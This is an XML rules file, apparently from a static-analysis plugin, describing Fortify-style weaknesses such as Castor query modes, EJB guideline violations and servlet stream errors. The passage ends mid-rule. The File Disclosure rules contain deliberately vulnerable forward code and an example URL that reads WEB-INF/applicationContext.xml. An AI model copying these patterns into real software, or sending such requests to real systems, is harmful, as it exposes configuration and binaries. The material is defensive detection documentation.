<rules>
	<!-- see names and descriptions in org/sonar/l10n/ -->
	<rule>
		<key>api_abuse_adf_faces_bad_practices_unsecure_attribute</key>
		<internalKey>API Abuse/ADF Faces Bad Practices/unsecure Attribute
		</internalKey>
		<name>ADF Faces Bad Practices: unsecure Attribute</name>
		<description><![CDATA[<h2>ABSTRACT</h2>
							<p>
							  The <code>unsecure</code> attribute specifies a list of attributes whose values can be set on the client.
							</p>
							<h2>EXPLANATION</h2>
							<p>
							  The values of attributes for Oracle ADF Faces components can ordinarily be set only on the server. However, a number of components allow the developer to define a list of attributes that can be set on the client. <code>unsecure</code> attribute of these components can specify such a list.<br><br>Currently, the only attribute that can appear inside the <code>unsecure</code> attribute is <code>disabled</code>, and it allows the client to define which components are enabled and which ones are not. It is never a good idea to let the client control the values of attributes that should only be settable on the server.<br><br><b>Example:</b> The following code demonstrates an <code>inputText</code> component that collects password information from the user and uses the <code>unsecure</code> attribute.<br><br><pre><br>...<br>    &lt;af:inputText id="pwdBox"<br>                  label="#{resources.PWD}"<br>                  value=""#{userBean.password}<br>                  unsecure="disabled"<br>                  secret="true"<br>                  required="true"/&gt;<br>...<br></pre>
							</p>
							 								<h2>REFERENCES</h2>
																								   <p>[1]  <em>Oracle ADF Faces Tag Reference</em> <br></p>]]></description>
		<severity>MAJOR</severity>
		<tag>api-abuse</tag>
	</rule>
	<rule>
		<key>api_abuse_castor_bad_practices_query_mode_not_read_only</key>
		<internalKey>API Abuse/Castor Bad Practices/Query Mode Not Read-Only
		</internalKey>
		<name>Castor Bad Practices: Query Mode Not Read-Only</name>
		<description><![CDATA[<h2>ABSTRACT</h2>
							<p>
							  A Castor query that is not read-only can have performance implications.
							</p>
							<h2>EXPLANATION</h2>
							<p>
							  Even if castor creates a lock on an object it does not prevent other threads from reading or writing to it. Read-only queries are also about 7 times faster compared with default shared mode.<br><br><b>Example 1:</b> The following example specifies the query mode as <code>SHARED</code> which allows both read and write access.<br><pre><br>results = query.execute(Database.SHARED);<br></pre>
							</p>
							 								<h2>REFERENCES</h2>
																								   <p>[1] Standards Mapping - Security Technical Implementation Guide Version 3 - (STIG 3) <em>APP3500 CAT II</em> <br></p>
																									   <p>[2] Standards Mapping - Security Technical Implementation Guide Version 3.4 - (STIG 3.4) <em>APP3500 CAT II</em> <br></p>
																									   <p>[3] Standards Mapping - Security Technical Implementation Guide Version 3.5 - (STIG 3.5) <em>APP3500 CAT II</em> <br></p>
																									   <p>[4] Standards Mapping - Security Technical Implementation Guide Version 3.6 - (STIG 3.6) <em>APP3500 CAT II</em> <br></p>
																									   <p>[5] Standards Mapping - Security Technical Implementation Guide Version 3.7 - (STIG 3.7) <em>APP3500 CAT II</em> <br></p>
																									   <p>[6] ExoLab Group <em>Castor JDO - Best practice</em> <br></p>
																									   <p>[7] Standards Mapping - Common Weakness Enumeration - (CWE) <em>CWE ID 265</em> <br></p>
																									   <p>[8] Standards Mapping - Payment Card Industry Data Security Standard Version 1.2 - (PCI 1.2) <em>Requirement 7.1.1</em> <br></p>
																									   <p>[9] Standards Mapping - Payment Card Industry Data Security Standard Version 2.0 - (PCI 2.0) <em>Requirement 7.1.1</em> <br></p>
																									   <p>[10] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 - (PCI 3.0) <em>Requirement 7.1.2</em> <br></p>]]></description>
		<severity>MAJOR</severity>
		<tag>api-abuse</tag>
	</rule>
	<rule>
		<key>api_abuse_castor_bad_practices_unspecified_query_mode</key>
		<internalKey>API Abuse/Castor Bad Practices/Unspecified Query Mode
		</internalKey>
		<name>Castor Bad Practices: Unspecified Query Mode</name>
		<description><![CDATA[<h2>ABSTRACT</h2>
							<p>
							  The Castor query does not explicitly define a query mode.
							</p>
							<h2>EXPLANATION</h2>
							<p>
							  By default Castor executes queries in shared mode. Since shared mode allows both read and write access, it is unclear what kind of operation the query is intended for. If the object is going to be used in a read-only context, shared access adds unnecessary performance overhead.<br><br><b>Example 1:</b> The following example does not specify a query mode.<br><pre><br>results = query.execute();    //missing query mode<br></pre>
							</p>
							 								<h2>REFERENCES</h2>
																								   <p>[1] Standards Mapping - Security Technical Implementation Guide Version 3 - (STIG 3) <em>APP3500 CAT II</em> <br></p>
																									   <p>[2] Standards Mapping - Security Technical Implementation Guide Version 3.4 - (STIG 3.4) <em>APP3500 CAT II</em> <br></p>
																									   <p>[3] Standards Mapping - Security Technical Implementation Guide Version 3.5 - (STIG 3.5) <em>APP3500 CAT II</em> <br></p>
																									   <p>[4] Standards Mapping - Security Technical Implementation Guide Version 3.6 - (STIG 3.6) <em>APP3500 CAT II</em> <br></p>
																									   <p>[5] Standards Mapping - Security Technical Implementation Guide Version 3.7 - (STIG 3.7) <em>APP3500 CAT II</em> <br></p>
																									   <p>[6] ExoLab Group <em>Castor JDO - Best practice</em> <br></p>
																									   <p>[7] Standards Mapping - Common Weakness Enumeration - (CWE) <em>CWE ID 265</em> <br></p>
																									   <p>[8] ExoLab Group, Intalio Inc., and Contributors <em>Database (Castor JavaDoc)</em> <br></p>
																									   <p>[9] Standards Mapping - Payment Card Industry Data Security Standard Version 1.2 - (PCI 1.2) <em>Requirement 7.1.1</em> <br></p>
																									   <p>[10] Standards Mapping - Payment Card Industry Data Security Standard Version 2.0 - (PCI 2.0) <em>Requirement 7.1.1</em> <br></p>
																									   <p>[11] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 - (PCI 3.0) <em>Requirement 7.1.2</em> <br></p>]]></description>
		<severity>MAJOR</severity>
		<tag>api-abuse</tag>
	</rule>
	<rule>
		<key>api_abuse_code_correctness_call_to_system_gc_</key>
		<internalKey>API Abuse/Code Correctness/Call to System.gc()
		</internalKey>
		<name>Code Correctness: Call to System.gc()</name>
		<description><![CDATA[<h2>ABSTRACT</h2>
							<p>
							  Explicit requests for garbage collection are a bellwether indicating likely performance problems.
							</p>
							<h2>EXPLANATION</h2>
							<p>
							  At some point in every Java developer's career, a problem surfaces that appears to be so mysterious, impenetrable, and impervious to debugging that there seems to be no alternative but to blame the garbage collector. Especially when the bug is related to time and state, there may be a hint of empirical evidence to support this theory: inserting a call to <code>System.gc()</code> sometimes seems to make the problem go away.<br><br>In almost every case we have seen, calling <code>System.gc()</code> is the wrong thing to do. In fact, calling <code>System.gc()</code> can cause performance problems if it is invoked too often.
							</p>
							 								<h2>REFERENCES</h2>
																								   <p>[1] Standards Mapping - OWASP Top 10 2004 - (OWASP 2004) <em>A9 Application Denial of Service</em> <br></p>
																									   <p>[2] Standards Mapping - Security Technical Implementation Guide Version 3 - (STIG 3) <em>APP6080 CAT II</em> <br></p>
																									   <p>[3] Standards Mapping - Security Technical Implementation Guide Version 3.4 - (STIG 3.4) <em>APP6080 CAT II</em> <br></p>
																									   <p>[4] Standards Mapping - Security Technical Implementation Guide Version 3.5 - (STIG 3.5) <em>APP6080 CAT II</em> <br></p>
																									   <p>[5] Standards Mapping - Security Technical Implementation Guide Version 3.6 - (STIG 3.6) <em>APP6080 CAT II</em> <br></p>
																									   <p>[6] Standards Mapping - Security Technical Implementation Guide Version 3.7 - (STIG 3.7) <em>APP6080 CAT II</em> <br></p>
																									   <p>[7] Standards Mapping - Common Weakness Enumeration - (CWE) <em>CWE ID 730</em> <br></p>
																									   <p>[8] D. H. Hovermeyer <em>FindBugs User Manual</em> <br></p>
																									   <p>[9] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 - (PCI 1.1) <em>Requirement 6.5.9</em> <br></p>
																									   <p>[10] Standards Mapping - NIST Special Publication 800-53 Revision 4 - (NIST SP 800-53 Rev.4) <em>SC-5 Denial of Service Protection (P1)</em> <br></p>]]></description>
		<severity>MAJOR</severity>
		<tag>api-abuse</tag>
	</rule>
	<rule>
		<key>api_abuse_code_correctness_class_does_not_implement_equals</key>
		<internalKey>API Abuse/Code Correctness/Class Does Not Implement
			equals
		</internalKey>
		<name>Code Correctness: Class Does Not Implement equals</name>
		<description><![CDATA[<h2>ABSTRACT</h2>
							<p>
							  The <code>equals()</code> method is called on an object that does not implement <code>equals()</code>.
							</p>
							<h2>EXPLANATION</h2>
							<p>
							  When comparing objects, developers usually want to compare properties of objects. However, calling <code>equals()</code> on a class (or any super class/interface) that does not explicitly implement <code>equals()</code> results in a call to the <code>equals()</code> method inherited from <code>java.lang.Object</code>. Instead of comparing object member fields or other properties, <code>Object.equals()</code> compares two object instances to see if they are the same. Although there are legitimate uses of <code>Object.equals()</code>, it is often an indication of buggy code.<br><br><b>Example 1:</b><br><pre><br>public class AccountGroup<br>{<br>	private int gid;<br><br>	public int getGid()<br>	{<br>		return gid;<br>	}<br><br>	public void setGid(int newGid)<br>	{<br>		gid = newGid;<br>	}<br>}<br>...<br>public class CompareGroup<br>{<br>	public boolean compareGroups(AccountGroup group1, AccountGroup group2)<br>	{<br>		return group1.equals(group2);   //equals() is not implemented in AccountGroup<br>	}<br>}<br></pre>
							</p>
							 								<h2>REFERENCES</h2>
																								   <p>[1] Standards Mapping - Common Weakness Enumeration - (CWE) <em>CWE ID 398</em> <br></p>]]></description>
		<severity>MAJOR</severity>
		<tag>api-abuse</tag>
	</rule>
	<rule>
		<key>api_abuse_code_correctness_erroneous_finalize___method</key>
		<internalKey>API Abuse/Code Correctness/Erroneous finalize() Method
		</internalKey>
		<name>Code Correctness: Erroneous finalize() Method</name>
		<description><![CDATA[<h2>ABSTRACT</h2>
							<p>
							  This <code>finalize()</code> method should call <code>super.finalize()</code>.
							</p>
							<h2>EXPLANATION</h2>
							<p>
							  The Java Language Specification states that it is a good practice for a <code>finalize()</code> method to call <code>super.finalize()</code> [1].<br><br><b>Example 1:</b>  The following method omits the call to <code>super.finalize()</code>.<br><br><pre><br>protected void finalize() {<br>  discardNative();<br>}<br></pre>
							</p>
							 								<h2>REFERENCES</h2>
																								   <p>[1] Standards Mapping - Common Weakness Enumeration - (CWE) <em>CWE ID 568</em> <br></p>
																									   <p>[2] J. Gosling, B. Joy, G. Steele, G. Bracha <em>The Java Language Specification, Second Edition</em> Addison-Wesley<br></p>]]></description>
		<severity>MAJOR</severity>
		<tag>api-abuse</tag>
	</rule>
	<rule>
		<key>api_abuse_code_correctness_multiple_stream_commits</key>
		<internalKey>API Abuse/Code Correctness/Multiple Stream Commits
		</internalKey>
		<name>Code Correctness: Multiple Stream Commits</name>
		<description><![CDATA[<h2>ABSTRACT</h2>
							<p>
							  After a servlet's output stream has already been committed, it is erroneous to reset the stream buffer or perform any other action that recommits to the stream. Likewise, it is erroneous to call <code>getWriter()</code> after calling <code>getOutputStream</code> or vice versa.
							</p>
							<h2>EXPLANATION</h2>
							<p>
							  Forwarding an <code>HttpServletRequest</code>, redirecting an <code>HttpServletResponse</code>, or flushing the servlet's output stream buffer causes the associated stream to commit. Any subsequent buffer resets or stream commits, such as additional flushes or redirects, will result in <code>IllegalStateException</code>s.<br><br>Furthermore, Java servlets allow data to be written to the response stream using either <code>ServletOutputStream</code> or <code>PrintWriter</code>, but not both. Calling <code>getWriter()</code> after having called <code>getOutputStream()</code>, or vice versa, will also cause an <code>IllegalStateException</code>.<br><br><br><br>At runtime, an <code>IllegalStateException</code> prevents the response handler from running to completion, effectively dropping the response. This can cause server instability, which is a sign of an improperly implemented servlet.<br><br><b>Example 1:</b> The following code redirects the servlet response after its output stream buffer has been flushed.<br><pre><br>public class RedirectServlet extends HttpServlet {<br>    public void doGet(HttpServletRequest req, HttpServletResponse res) throws ServletException, IOException {<br>        ...<br>        OutputStream out = res.getOutputStream();<br>        ...<br>        // flushes, and thereby commits, the output stream<br>        out.flush();<br>        out.close();        // redirecting the response causes an IllegalStateException<br>        res.sendRedirect("http://www.acme.com");<br>    }<br>}<br></pre><br><br><b>Example 2:</b> Conversely, the following code attempts to write to and flush the <code>PrintWriter</code>'s buffer after the request has been forwarded.<br><pre><br>public class FlushServlet extends HttpServlet {<br>    public void doGet(HttpServletRequest req, HttpServletResponse res) throws ServletException, IOException {<br>        ...<br>        // forwards the request, implicitly committing the stream<br>        getServletConfig().getServletContext().getRequestDispatcher("/jsp/boom.jsp").forward(req, res);<br>        ...<br><br>        // IllegalStateException; cannot redirect after forwarding<br>        res.sendRedirect("http://www.acme.com/jsp/boomboom.jsp");<br><br>        PrintWriter out = res.getWriter();<br><br>        // writing to an already-committed stream will not cause an exception,<br>        // but will not apply these changes to the final output, either<br>        out.print("Writing here does nothing");<br><br>        // IllegalStateException; cannot flush a response's buffer after forwarding the request<br>        out.flush();<br>        out.close();<br>    }<br>}<br></pre>
							</p>
							 								<h2>REFERENCES</h2>
																								   <p>[1] Standards Mapping - Common Weakness Enumeration - (CWE) <em>CWE ID 398</em> <br></p>
																									   <p>[2]  <em>IllegalStateException in a Servlet - when &amp; why do we get?</em> <br></p>
																									   <p>[3] Standards Mapping - NIST Special Publication 800-53 Revision 4 - (NIST SP 800-53 Rev.4) <em>SC-5 Denial of Service Protection (P1)</em> <br></p>]]></description>
		<severity>MAJOR</severity>
		<tag>api-abuse</tag>
	</rule>
	<rule>
		<key>api_abuse_code_correctness_negative_content_length</key>
		<internalKey>API Abuse/Code Correctness/Negative Content-Length
		</internalKey>
		<name>Code Correctness: Negative Content-Length</name>
		<description><![CDATA[<h2>ABSTRACT</h2>
							<p>
							  <code>Content-Length</code> header is set as negative.
							</p>
							<h2>EXPLANATION</h2>
							<p>
							  In most cases, setting the <code>Content-Length</code> header of a request indicates a developer is interested in<br>communicating the length of the POST data sent to the server.  However, this header should be <code>0</code> or a<br>positive integer.<br><br><b>Example 1:</b> The following code will set an incorrect <code>Content-Length</code>.<br><pre><br>  URL url = new URL("http://www.hp.com");<br>  HttpURLConnection huc = (HttpURLConnection)url.openConnection();<br>  huc.setRequestProperty("Content-Length", "-1000");<br></pre>
							</p>
							 								<h2>REFERENCES</h2>
																								   <p>[1] Standards Mapping - Common Weakness Enumeration - (CWE) <em>CWE ID 398</em> <br></p>
																									   <p>[2] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 - (PCI 3.0) <em>Requirement 6.5.6</em> <br></p>]]></description>
		<severity>MAJOR</severity>
		<tag>api-abuse</tag>
	</rule>
	<rule>
		<key>api_abuse_code_correctness_tostring_on_array</key>
		<internalKey>API Abuse/Code Correctness/toString on Array
		</internalKey>
		<name>Code Correctness: toString on Array</name>
		<description><![CDATA[<h2>ABSTRACT</h2>
							<p>
							  <code>toString()</code> is called on an array.
							</p>
							<h2>EXPLANATION</h2>
							<p>
							  In most cases, a call to <code>toString()</code> on an array indicates a developer is interested in returning the contents of the array as a String. However, a direct call to <code>toString()</code> on an array will return a string value containing the array's type and hashcode in memory.<br><b>Example 1:</b> The following code will output <code>[Ljava.lang.String;@1232121</code>.<br><pre><br>String[] strList = new String[5];<br>...<br>System.out.println(strList);<br></pre>
							</p>
							 								<h2>REFERENCES</h2>
																								   <p>[1]  <em>Class Arrays</em> Sun Microsystems<br></p>
																									   <p>[2] Standards Mapping - Common Weakness Enumeration - (CWE) <em>CWE ID 398</em> <br></p>]]></description>
		<severity>MAJOR</severity>
		<tag>api-abuse</tag>
	</rule>
	<rule>
		<key>api_abuse_dangerous_field</key>
		<internalKey>API Abuse/Dangerous Field</internalKey>
		<name>Dangerous Field</name>
		<description><![CDATA[<h2>ABSTRACT</h2>
							<p>
							  The field has been annotated as dangerous. All uses will be flagged.
							</p>
							<h2>EXPLANATION</h2>
							<p>
							  The annotation FortifyDangerous has been applied to this field. This is used to indicate that it is dangerous and all uses should be examined for safety.<br>
							</p>]]></description>
		<severity>MAJOR</severity>
		<tag>api-abuse</tag>
	</rule>
	<rule>
		<key>api_abuse_dangerous_method</key>
		<internalKey>API Abuse/Dangerous Method</internalKey>
		<name>Dangerous Method</name>
		<description><![CDATA[<h2>ABSTRACT</h2>
							<p>
							  The method is called with untrusted data.
							</p>
							<h2>EXPLANATION</h2>
							<p>
							  The annotation FortifySink has been applied to this function. This is used to indicate that this function is dangerous when called with tainted data.<br>
							</p>
							 								<h2>REFERENCES</h2>
																								   <p>[1] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 - (PCI 3.0) <em>Requirement 6.5.6</em> <br></p>
																									   <p>[2] Standards Mapping - SANS Top 25 2011 - (SANS Top 25 2011) <em>Risky Resource Management - CWE ID 676</em> <br></p>]]></description>
		<severity>MAJOR</severity>
		<tag>api-abuse</tag>
	</rule>
	<rule>
		<key>api_abuse_dangerous_type</key>
		<internalKey>API Abuse/Dangerous Type</internalKey>
		<name>Dangerous Type</name>
		<description><![CDATA[<h2>ABSTRACT</h2>
							<p>
							  The function has a parameter or return value of a type which has been annotated as dangerous.
							</p>
							<h2>EXPLANATION</h2>
							<p>
							  The annotation FortifyDangerous has been applied to this type. This is used to indicate that it is dangerous and all uses should be examined for safety.<br><br>
							</p>
							 								<h2>REFERENCES</h2>
																								   <p>[1] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 - (PCI 3.0) <em>Requirement 6.5.6</em> <br></p>]]></description>
		<severity>MAJOR</severity>
		<tag>api-abuse</tag>
	</rule>
	<rule>
		<key>api_abuse_ejb_bad_practices_use_of_awt_swing</key>
		<internalKey>API Abuse/EJB Bad Practices/Use of AWT/Swing
		</internalKey>
		<name>EJB Bad Practices: Use of AWT/Swing</name>
		<description><![CDATA[<h2>ABSTRACT</h2>
							<p>
							  The program violates the Enterprise JavaBeans specification by using AWT/Swing. 
							</p>
							<h2>EXPLANATION</h2>
							<p>
							  The Enterprise JavaBeans specification requires that every bean provider follow a set of programming guidelines designed to ensure that the bean will be portable and behave consistently in any EJB container [1].<br><br>In this case, the program violates the following EJB guideline:<br><br>"An enterprise bean must not use the AWT functionality to attempt to output information to a display, or to input information from a keyboard."<br><br>A requirement that the specification justifies in the following way:<br><br>"Most servers do not allow direct interaction between an application program and a keyboard/display attached to the server system."
							</p>
							 								<h2>REFERENCES</h2>
																								   <p>[1] Standards Mapping - Common Weakness Enumeration - (CWE) <em>CWE ID 575</em> <br></p>
																									   <p>[2]  <em>The Enterprise JavaBeans 2.1 Specification</em> Sun Microsystems<br></p>]]></description>
		<severity>MAJOR</severity>
		<tag>api-abuse</tag>
	</rule>
	<rule>
		<key>api_abuse_ejb_bad_practices_use_of_class_loader</key>
		<internalKey>API Abuse/EJB Bad Practices/Use of Class Loader
		</internalKey>
		<name>EJB Bad Practices: Use of Class Loader</name>
		<description><![CDATA[<h2>ABSTRACT</h2>
							<p>
							  The program violates the Enterprise JavaBeans specification by using the class loader.
							</p>
							<h2>EXPLANATION</h2>
							<p>
							  The Enterprise JavaBeans specification requires that every bean provider follow a set of programming guidelines designed to ensure that the bean will be portable and behave consistently in any EJB container [1].<br><br>In this case, the program violates the following EJB guideline:<br><br>"The enterprise bean must not attempt to create a class loader; obtain the current class loader; set the context class loader; set security manager; create a new security manager; stop the JVM; or change the input, output, and error streams."<br><br>A requirement that the specification justifies in the following way:<br><br>"These functions are reserved for the EJB container. Allowing the enterprise bean to use these functions could compromise security and decrease the container's ability to properly manage the runtime environment."
							</p>
							 								<h2>REFERENCES</h2>
																								   <p>[1] Standards Mapping - Common Weakness Enumeration - (CWE) <em>CWE ID 578</em> <br></p>
																									   <p>[2]  <em>The Enterprise JavaBeans 2.1 Specification</em> Sun Microsystems<br></p>]]></description>
		<severity>MAJOR</severity>
		<tag>api-abuse</tag>
	</rule>
	<rule>
		<key>api_abuse_ejb_bad_practices_use_of_sockets</key>
		<internalKey>API Abuse/EJB Bad Practices/Use of Sockets</internalKey>
		<name>EJB Bad Practices: Use of Sockets</name>
		<description><![CDATA[<h2>ABSTRACT</h2>
							<p>
							  The program violates the Enterprise JavaBeans specification by using sockets.
							</p>
							<h2>EXPLANATION</h2>
							<p>
							  The Enterprise JavaBeans specification requires that every bean provider follow a set of programming guidelines designed to ensure that the bean will be portable and behave consistently in any EJB container [1].<br><br>In this case, the program violates the following EJB guideline:<br><br>"An enterprise bean must not attempt to listen on a socket, accept connections on a socket, or use a socket for multicast."<br><br>A requirement that the specification justifies in the following way:<br><br>"The EJB architecture allows an enterprise bean instance to be a network socket client, but it does not allow it to be a network server. Allowing the instance to become a network server would conflict with the basic function of the enterprise bean-- to serve the EJB clients."
							</p>
							 								<h2>REFERENCES</h2>
																								   <p>[1] Standards Mapping - Common Weakness Enumeration - (CWE) <em>CWE ID 577</em> <br></p>
																									   <p>[2]  <em>The Enterprise JavaBeans 2.1 Specification</em> Sun Microsystems<br></p>]]></description>
		<severity>MAJOR</severity>
		<tag>api-abuse</tag>
	</rule>
	<rule>
		<key>api_abuse_ejb_bad_practices_use_of_synchronization_primitives
		</key>
		<internalKey>API Abuse/EJB Bad Practices/Use of Synchronization
			Primitives
		</internalKey>
		<name>EJB Bad Practices: Use of Synchronization Primitives</name>
		<description><![CDATA[<h2>ABSTRACT</h2>
							<p>
							  The program violates the Enterprise JavaBeans specification by using thread synchronization primitives.
							</p>
							<h2>EXPLANATION</h2>
							<p>
							  The Enterprise JavaBeans specification requires that every bean provider follow a set of programming guidelines designed to ensure that the bean will be portable and behave consistently in any EJB container [1].<br><br>In this case, the program violates the following EJB guideline:<br><br>"An enterprise bean must not use thread synchronization primitives to synchronize execution of multiple instances."<br><br>A requirement that the specification justifies in the following way:<br><br>"This rule is required to ensure consistent runtime semantics because while some EJB containers may use a single JVM to execute all enterprise bean's instances, others may distribute the instances across multiple JVMs."
							</p>
							 								<h2>REFERENCES</h2>
																								   <p>[1] Standards Mapping - Common Weakness Enumeration - (CWE) <em>CWE ID 574</em> <br></p>
																									   <p>[2]  <em>The Enterprise JavaBeans 2.1 Specification</em> Sun Microsystems<br></p>]]></description>
		<severity>MAJOR</severity>
		<tag>api-abuse</tag>
	</rule>
	<rule>
		<key>api_abuse_ejb_bad_practices_use_of_java_io</key>
		<internalKey>API Abuse/EJB Bad Practices/Use of java.io</internalKey>
		<name>EJB Bad Practices: Use of java.io</name>
		<description><![CDATA[<h2>ABSTRACT</h2>
							<p>
							  The program violates the Enterprise JavaBeans specification by using the <code>java.io</code> package.
							</p>
							<h2>EXPLANATION</h2>
							<p>
							  The Enterprise JavaBeans specification requires that every bean provider follow a set of programming guidelines designed to ensure that the bean will be portable and behave consistently in any EJB container [1].<br><br>In this case, the program violates the following EJB guideline:<br><br>"An enterprise bean must not use the java.io package to attempt to access files and directories in the file system."<br><br>A requirement that the specification justifies in the following way:<br><br>"The file system APIs are not well-suited for business components to access data. Business components should use a resource manager API, such as JDBC, to store data."
							</p>
							 								<h2>REFERENCES</h2>
																								   <p>[1] Standards Mapping - Common Weakness Enumeration - (CWE) <em>CWE ID 576</em> <br></p>
																									   <p>[2]  <em>The Enterprise JavaBeans 2.1 Specification</em> Sun Microsystems<br></p>]]></description>
		<severity>MAJOR</severity>
		<tag>api-abuse</tag>
	</rule>
	<rule>
		<key>api_abuse_file_disclosure_j2ee</key>
		<internalKey>API Abuse/File Disclosure/J2EE</internalKey>
		<name>File Disclosure: J2EE</name>
		<description><![CDATA[<h2>ABSTRACT</h2>
							<p>
							  Constructing a server-side redirect path with user input could allow an attacker to download application binaries (including application classes or jar files) or view arbitrary files within protected directories.
							</p>
							<h2>EXPLANATION</h2>
							<p>
							  A file disclosure occur when:<br>1. Data enters a program from an untrusted source.<br><br><br>2. The data is used to dynamically construct a path.<br><br><br><br><b>Example 1:</b> The following code takes untrusted data and uses it to build a path which is used in a server side forward.<br><br><pre><br>...<br>String returnURL = request.getParameter("returnURL");<br>	RequestDispatcher rd = request.getRequestDispatcher(returnURL);<br>	rd.forward();<br>...<br></pre><br><br><b>Example 2:</b> The following code takes untrusted data and uses it to build a path which is used in a server side forward.<br><br><pre><br>...<br>	&lt;% String returnURL = request.getParameter("returnURL"); %&gt;<br>	&lt;jsp:include page="&lt;%=returnURL%&gt;" /&gt;<br>	...<br></pre><br><br>If an attacker provided a URL with the request parameter matching a sensitive file location, they would be able to view that file. For example, &quot;http://www.yourcorp.com/webApp/logic?returnURL=WEB-INF/applicationContext.xml&quot; would allow them to view the applicationContext.xml of the application.<br>Once the attacker had the applicationContext.xml, they could locate and download other configuration files referenced in the applicationContext.xml or even class or jar files. This would allow attackers to gain sensitive infomation about an application and target it for other types of attack.
							</p>
							 								<h2>REFERENCES</h2>
																								   <p>[1] Standards Mapping - OWASP Top 10 2004 - (OWASP 2004) <em>A1 Unvalidated Input</em> <br></p>
																									   <p>[2] Standards Mapping - OWASP Top 10 2007 - (OWASP 2007) <em>A4 Insecure Direct Object Reference</em> <br></p>
																									   <p>[3] Standards Mapping - OWASP Top 10 2010 - (OWASP 2010) <em>A4 Insecure Direct Object References</em> <br></p>
																									   <p>[4] Standards Mapping - OWASP Top 10 2013 - (OWASP 2013) <em>A4 Insecure Direct Object References</em> <br></p>
																									   <p>[5] Standards Mapping - Common Weakness Enumeration - (CWE) <em>CWE ID 552</em> <br></p>
																									   <p>[6] Standards Mapping - OWASP Mobile Top 10 Risks 2014 - (OWASP Mobile 2014) <em>M1 Weak Server Side Controls</em> <br></p>
																									   <p>[7] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 - (PCI 1.1) <em>Requirement 6.5.1</em> <br></p>
																									   <p>[8] Standards Mapping - Payment Card Industry Data Security Standard Version 1.2 - (PCI 1.2) <em>Requirement 6.5.4</em> <br></p>
																									   <p>[9] Standards Mapping - Payment Card Industry Data Security Standard Version 2.0 - (PCI 2.0) <em>Requirement 6.5.8</em> <br></p>
																									   <p>[10] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 - (PCI 3.0) <em>Requirement 6.5.8</em> <br></p>
																									   <p>[11] Standards Mapping - SANS Top 25 2009 - (SANS 2009) <em>Risky Resource Management - CWE ID 073</em> <br></p>
																									   <p>[12] Standards Mapping - NIST Special Publication 800-53 Revision 4 - (NIST SP 800-53 Rev.4) <em>SI-10 Information Input Validation (P1)</em> <br></p>
																									   <p>[13] Ryan Berg and Dinis Cruz <em>Two Security Vulnerabilities in the Spring Framework's MVC</em> <br></p>]]></description>
		<severity>MAJOR</severity>
		<tag>api-abuse</tag>
	</rule>
	<rule>
		<key>api_abuse_file_disclosure_spring</key>
		<internalKey>API Abuse/File Disclosure/Spring</internalKey>
		<name>File Disclosure: Spring</name>
		<description><![CDATA[<h2>ABSTRACT</h2>
							<p>
							  Constructing a server-side redirect path with user input could allow an attacker to download application binaries (including application classes or jar files) or view arbitrary files within protected directories.
							</p>
							<h2>EXPLANATION</h2>
							<p>
							  A file disclosure occur when:<br>1. Data enters a program from an untrusted source.<br><br><br>2. The data is used to dynamically construct a path.<br><br><br><br><b>Example 1:</b> The following code takes untrusted data and uses it to build a path which is used in a server side forward.<br><br><pre><br>...<br>	String returnURL = request.getParameter("returnURL");<br>	return new ModelAndView(returnURL);<br>	...<br></pre><br><br>If an attacker provided a URL with the request parameter matching a sensitive file location, they would be able to view that file. For example, &quot;http://www.yourcorp.com/webApp/logic?returnURL=WEB-INF/applicationContext.xml&quot; would allow them to view the applicationContext.xml of the application.<br>Once the attacker had the applicationContext.xml, they could locate and download other configuration files referenced in the applicationContext.xml or even class or jar files. This would allow attackers to gain sensitive infomation about an application and target it for other types of attack.
							</p>
							 								<h2>REFERENCES</h2>
																								   <p>[1] Standards Mapping - OWASP Top 10 2004 - (OWASP 2004) <em>A1 Unvalidated Input</em> <br></p>
																									   <p>[2] Standards Mapping - OWASP Top 10 2007 - (OWASP 2007) <em>A4 Insecure Direct Object Reference</em> <br></p>
																									   <p>[3] Standards Mapping - OWASP Top 10 2010 - (OWASP 2010) <em>A4 Insecure Direct Object References</em> <br></p>
																									   <p>[4] Standards Mapping - OWASP Top 10 2013 - (OWASP 2013) <em>A4 Insecure Direct Object References</em> <br></p>
																									   <p>[5] Standards Mapping - Common Weakness Enumeration - (CWE) <em>CWE ID 552</em> <br></p>
																									   <p>[6] Standards Mapping - OWASP Mobile Top 10 Risks 2014 - (OWASP Mobile 2014) <em>M1 Weak Server Side Controls</em> <br></p>
																									   <p>[7] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 - (PCI 1.1) <em>Requirement 6.5.1</em> <br></p>
																									   <p>[8] Standards Mapping - Payment Card Industry Data Security Standard Version 1.2 - (PCI 1.2) <em>Requirement 6.5.4</em> <br></p>
																									   <p>[9] Standards Mapping - Payment Card Industry Data Security Standard Version 2.0 - (PCI 2.0) <em>Requirement 6.5.8</em> <br></p>
																									   <p>[10] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 - (PCI 3.0) <em>Requirement 6.5.8</em> <br></p>
																									   <p>[11] Standards Mapping - SANS Top 25 2009 - (SANS 2009) <em>Risky Resource Management - CWE ID 073</em> <br></p>
																									   <p>[12] Standards Mapping - NIST Special Publication 800-53 Revision 4 - (NIST SP 800-53 Rev.4) <em>SI-10 Information Input Validation (P1)</em> <br></p>
																									   <p>[13] Ryan Berg and Dinis Cruz <em>Two Security Vulnerabilities in the Spring Framework's MVC</em> <br></p>]]></description>
		<severity>MAJOR</severity>
		<tag>api-abuse</tag>
	</rule>
	<rule>
		<key>api_abuse_file_disclosure_spring_webflow</key>
		<internalKey>API Abuse/File Disclosure/Spring Webflow</internalKey>
		<name>File Disclosure: Spring Webflow</name>
		<description><![CDATA[<h2>ABSTRACT</h2>
							<p>
							  Constructing a server-side redirect path with user input could allow an attacker to download application binaries (including application classes or jar files) or view arbitrary files within protected directories.
							</p>
							<h2>EXPLANATION</h2>
							<p>
